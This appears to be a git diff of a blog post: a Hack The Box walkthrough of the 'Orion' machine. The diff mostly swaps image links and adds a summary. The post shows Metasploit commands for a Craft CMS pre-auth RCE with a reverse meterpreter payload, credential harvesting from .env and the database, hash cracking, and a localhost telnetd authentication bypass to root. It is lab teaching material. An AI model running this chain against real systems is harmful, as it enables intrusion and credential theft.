@@ -2,6 +2,7 @@
 title: "Orion: Craft CMS RCE to Root (Walkthrough)"
 date: 2026-10-24
 draft: false
+summary: "A Hack The Box walkthrough of Orion, an Ubuntu machine running Craft CMS 5.6.16 behind nginx. Covers the pre-auth RCE (CVE-2025-32432), cracking the admin hash, and the localhost telnetd bypass to root."
 tags:
   - CTF
   - Web Exploitation
@@ -12,7 +13,7 @@ categories:
   - CTF Writeups
 ---
 
-![Orion banner](https://files.catbox.moe/dwonlq.png)
+![Orion banner](/images/orion-banner.webp)
 
 Orion is an Ubuntu 22.04.5 Hack The Box machine themed around a small telecom company. The site lives at `orion.htb`, running Craft CMS 5.6.16 behind nginx, with SSH open and not much else. It's a web-focused box: the app is where the story starts, and most of the interesting bits come from how it's configured.
 
@@ -32,7 +33,7 @@ PORT   STATE SERVICE VERSION
 80/tcp open  http    nginx 1.18.0 (Ubuntu)
 ```
 
-![nmap scan](https://files.catbox.moe/f9sfe1.png)
+![nmap scan](/images/orion-nmap-scan.webp)
 
 Two ports. I also ran a UDP scan and a full TCP scan, mostly out of habit, but nothing else was listening.
 
@@ -42,7 +43,7 @@ The web server wanted a hostname, so I added `orion.htb` to `/etc/hosts`:
 echo "10.129.244.146 orion.htb" | sudo tee -a /etc/hosts
 ```
 
-![hosts file](https://files.catbox.moe/3297yc.png)
+![hosts file](/images/orion-hosts-file.webp)
 
 Then I fingerprinted the site. `whatweb` and `curl -I` both pointed at Craft CMS:
 
@@ -51,11 +52,11 @@ whatweb http://orion.htb
 curl -I http://orion.htb
 ```
 
-![whatweb](https://files.catbox.moe/4ap9w2.png)
+![whatweb](/images/orion-whatweb.webp)
 
 `whatweb` gave me the usual summary (nginx, Ubuntu, Craft CMS), and the response headers confirmed it with `X-Powered-By`. The page title was Orion Telecom.
 
-![Craft CMS headers](https://files.catbox.moe/wbkqk8.png)
+![Craft CMS headers](/images/orion-craft-cms-headers.webp)
 
 There was an admin panel, but I didn't have a login yet. I ran ffuf against the usual raft wordlist:
 
@@ -64,11 +65,11 @@ ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt \
      -u http://orion.htb/FUZZ
 ```
 
-![ffuf](https://files.catbox.moe/ni3is8.png)
+![ffuf](/images/orion-ffuf.webp)
 
 A lot of the `p1`, `p2`, `p13` results were the same 12,272-byte catch-all page, so I ignored them. The useful hits were `admin`, `assets`, and `logout`. `/admin` redirected to `/admin/login`, and the footer gave away the version: Craft CMS 5.6.16.
 
-![Craft CMS admin login](https://files.catbox.moe/hrwxmi.png)
+![Craft CMS admin login](/images/orion-craft-cms-admin-login.webp)
 
 ## 02: Shell via Craft CMS
 
@@ -84,7 +85,7 @@ msf6 exploit(...) > set PAYLOAD php/meterpreter/reverse_http
 msf6 exploit(...) > run
 ```
 
-![Metasploit module options](https://files.catbox.moe/ot5h76.png)
+![Metasploit module options](/images/orion-metasploit-module-options.webp)
 
 The module leaked the PHP session save path, wrote a payload into it, and triggered it. A few seconds later I had a meterpreter session:
 
@@ -95,7 +96,7 @@ The module leaked the PHP session save path, wrote a payload into it, and trigge
 [*] Meterpreter session 16 opened
 ```
 
-![Metasploit run](https://files.catbox.moe/0o6snp.png)
+![Metasploit run](/images/orion-metasploit-run.webp)
 
 The session landed as `www-data` inside `/var/www/html/craft/web`. I tried `shell` to get a proper command shell, but nothing happened, and the usual Python PTY trick didn't work either. I stopped fighting it and used Meterpreter's `execute` to run commands directly.
 
@@ -113,7 +114,7 @@ CRAFT_DB_USER=root
 CRAFT_DB_PASSWORD=<password>
 ```
 
-![Craft CMS .env](https://files.catbox.moe/7nmcu4.png)
+![Craft CMS .env](/images/orion-craft-cms-env.webp)
 
 The app was talking to MySQL as root. That's the kind of thing that turns a web shell into a full database compromise.
 
@@ -125,7 +126,7 @@ Process 2291 created.
 meterpreter > cat /tmp/mysql_tables.txt
 ```
 
-![MySQL tables](https://files.catbox.moe/4klpbp.png)
+![MySQL tables](/images/orion-mysql-tables.webp)
 
 Then the users table, same trick:
 
@@ -134,7 +135,7 @@ id  username  email             password      admin
 1   admin     adam@orion.htb    <password>    1
 ```
 
-![Craft CMS users table](https://files.catbox.moe/iawr26.png)
+![Craft CMS users table](/images/orion-craft-cms-users-table.webp)
 
 The admin email was `adam@orion.htb`. That was a pretty obvious hint that the same person had a local account.
 
@@ -146,7 +147,7 @@ The password was stored as a bcrypt hash. I saved it to a file and threw `rockyo
 john --wordlist=/usr/share/wordlists/rockyou.txt adam_hash.txt
 ```
 
-![John the Ripper](https://files.catbox.moe/xqrntz.png)
+![John the Ripper](/images/orion-john-the-ripper.webp)
 
 It cracked almost immediately. The password was weak enough to be in the wordlist. That gave me SSH credentials for `adam`.
 
@@ -162,7 +163,7 @@ cat user.txt
 <flag>
 ```
 
-![User flag](https://files.catbox.moe/dzygty.png)
+![User flag](/images/orion-user-flag.webp)
 
 Nothing. No sudo rights, no obvious SUID shortcuts. Time to look at what else the box was running.
 
@@ -174,7 +175,7 @@ I checked the listening sockets with `ss -lntp`. Most of it was expected (SSH, n
 ss -lntp
 ```
 
-![Local services and telnet version](https://files.catbox.moe/gbsv4k.png)
+![Local services and telnet version](/images/orion-local-services-telnet-version.webp)
 
 Port 23 was telnetd, bound to localhost. It wasn't reachable from the network, but it was reachable from the shell. The version was GNU inetutils 2.7, which is vulnerable to CVE-2026-24061.
 
@@ -194,7 +195,7 @@ whoami
 [+] VULNERABLE
 ```
 
-![telnetd bypass](https://files.catbox.moe/kurnre.png)
+![telnetd bypass](/images/orion-telnetd-bypass.webp)
 
 The session that came back was a root login:
 
@@ -219,7 +220,7 @@ root
 <flag>
 ```
 
-![Root flag](https://files.catbox.moe/mswh8z.png)
+![Root flag](/images/orion-root-flag.webp)
 
 That's the box.
 
@@ -237,3 +238,5 @@ One bug led to the next: the CMS leaked a config file, the config file leaked th
 ---
 
 *Authorized training environment only. Don't test systems you don't own or have permission to assess.*
+
+
